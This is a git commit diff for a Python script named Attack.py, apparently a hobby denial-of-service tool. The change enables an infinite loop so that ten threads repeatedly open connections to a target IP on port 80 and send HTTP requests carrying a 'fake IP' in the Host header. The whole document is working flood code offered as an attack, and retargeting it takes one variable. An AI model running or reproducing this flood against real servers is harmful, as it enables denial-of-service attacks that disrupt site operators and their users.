c9cdc0af7efdab0db8c14fd6d3de612afad788ad
Jadosman98 <73310879+Jadosman98@users.noreply.github.com>
2020-10-23 00:50:55 +0300

    Update Attack.py

--- Attack.py
+++ Attack.py
@@ -6,14 +6,15 @@ targetIP = '127.0.0.1'
 fakeIP = '182.21.20.32'
 port = 80
 def ddos():
-    #while True:
+    while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open a socket 
         s.connect((targetIP, port)) #connect to the targeted ip and port to attack him
         s.sendto(("GET /" + targetIP + " HTTP/1.1\r\n").encode('ascii'), (targetIP, port))
         s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (targetIP, port)) 
         s.close()
-        # sending an hhtp request(because in this case we are attacking port 80) using the fake ip
-for i in range(10):
+        # sending an http request(because in this case we are attacking port 80) using the fake ip
+for i in range(10):    #initiating many threads
      thread = threading.Thread(target=ddos)
      thread.start()
      print("Connection number",i)
+#initiating many threads
